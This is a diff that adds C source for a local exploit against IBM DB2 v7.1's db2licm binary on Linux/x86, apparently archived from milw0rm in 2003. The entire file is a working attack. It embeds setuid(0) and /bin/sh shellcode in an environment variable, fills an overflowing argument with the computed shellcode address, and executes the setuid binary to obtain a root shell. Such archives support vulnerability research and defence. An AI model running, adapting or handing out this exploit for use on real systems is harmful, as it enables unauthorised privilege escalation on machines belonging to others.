@@ -1,0 +1,103 @@
+/* 
+	Local Exploit for db2licm 
+	IBM db2 v 7.1 Linux/x86 
+
+	vulnerability researched by 
+	Juan Manuel Pascual Escriba
+	pask at uninet.edu
+
+
+ */
+
+
+
+char sc[]=
+"\x31\xc0"      /* begin setuid (0) */
+"\x31\xdb"
+"\xb0\x17"
+"\xcd\x80"
+
+"\xeb\x1f"
+"\x5e"
+"\x89\x76\x08"
+"\x31\xc0"
+"\x88\x46\x07"
+"\x89\x46\x0c"
+"\xb0\x0b"
+"\x89\xf3"
+"\x8d\x4e\x08"
+"\x8d\x56\x0c"
+"\xcd\x80"
+"\x31\xdb"
+"\x89\xd8"
+"\x40"
+"\xcd\x80"
+"\xe8\xdc\xff\xff\xff"
+"/bin/sh";
+
+
+#define STACK_TOP_X86 0xC0000000
+#define ALG_MASK 0xfffffff4
+#define ADDR 1000
+#define DB2LICM "/home/db2inst1/sqllib/adm/db2licm"
+
+#define DFL_ALG 4       
+
+int main(int arc, char **arv){
+        char *argv[3];
+        char *envp[2];
+        unsigned long sc_address, ba=0;
+        unsigned char alg = DFL_ALG;
+        unsigned long *p;
+        unsigned char *q;
+        unsigned int i;
+
+
+
+        sc_address = STACK_TOP_X86 - 4 - strlen(DB2LICM) - sizeof(sc) - 1;
+        printf("shellcode address = 0x%X\n",sc_address);
+
+
+        if( (sc_address & ALG_MASK) != sc_address ) {
+                ba = sc_address - (sc_address & ALG_MASK);
+                printf("adding %d trailing bytes to backward align Shellcode to 0x%X\n", ba,
+sc_address & ALG_MASK);
+                sc_address = STACK_TOP_X86 - 4 - strlen(DB2LICM) - sizeof(sc) - ba - 1;
+                printf("new shellcode address = 0x%X\n",sc_address);
+        }
+
+        envp[0] = (char*)malloc(sizeof(sc)+strlen("pete=")+1+ba);
+        q = envp[0];
+        strcpy(q,"pete=");
+        q += strlen("pete=");
+        memcpy(q,sc,sizeof(sc));
+        q += sizeof(sc)-1;
+        memset(q,'A',ba);
+        q += ba;
+        *q = 0;
+        envp[1] = 0;
+
+        /* build overflowing arvg[2] */
+
+
+        printf("using alignment = %d in overflow buffer\n",alg);
+
+        argv[0] = DB2LICM;
+	argv[1] = "-a";
+        argv[2] = (char*)malloc(ADDR*sizeof(unsigned long)+alg+1);
+        memset(argv[2],'A',alg);
+        p=(unsigned long*)(argv[2]+alg);
+        for(i=0;i<ADDR;i++) {
+                *p = sc_address;
+                p++;
+        };
+        *p = 0;
+        argv[3] = 0; 
+
+        printf("executing %s ...\n\n",argv[0]);
+        execve(argv[0],argv,envp); 
+
+
+}
+
+// milw0rm.com [2003-09-27]
